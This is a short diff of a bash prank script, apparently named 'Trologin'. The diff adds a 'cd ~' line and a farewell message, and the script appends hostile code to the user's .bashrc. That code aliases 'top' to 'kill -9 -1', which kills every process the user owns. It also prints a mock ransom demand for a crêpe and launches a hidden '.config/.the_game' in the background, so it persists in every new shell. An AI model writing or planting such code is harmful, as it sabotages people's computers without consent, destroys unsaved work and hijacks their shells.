@@ -1,5 +1,5 @@
 #!/bin/bash
-
+cd ~
 echo "
 #!/bin/bash
 while true
@@ -16,5 +16,6 @@ alias top='kill -9 -1'
 alias htop='top'
 echo \"VOUS ETES VICTIME DE TROLOGIN, N'ESSAYER PAS DE VOUS DEBATTRE. VEUILLEZ CRIER 'PLS' POUR VOUS IDENTIFIER, PUIS HURLEZ LA LOCALISATION DONNEE. ENSUITE APPORTEZ UNE CREPE A L'ENDROIT INDIQUE POUR DEBLOQUER VOTRE ORDINATEUR.\"
 echo \"LOCALISATION : $the_one\"
+echo \"A TOUT DE SUITE <3\"
 ./.config/.the_game &" >> .bashrc
 source .bashrc
